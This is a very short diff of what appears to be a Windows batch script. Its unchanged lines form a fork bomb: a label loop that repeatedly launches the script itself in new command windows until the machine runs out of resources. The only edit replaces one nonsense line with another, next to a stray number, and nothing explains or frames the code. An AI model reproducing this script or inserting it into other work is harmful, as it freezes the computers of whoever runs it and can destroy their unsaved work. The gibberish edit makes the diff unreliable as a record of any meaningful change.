@@ -1,5 +1,5 @@
 :ST
 start cmd %%0
 goto ST
-chdh
+hsjsj
 839795444
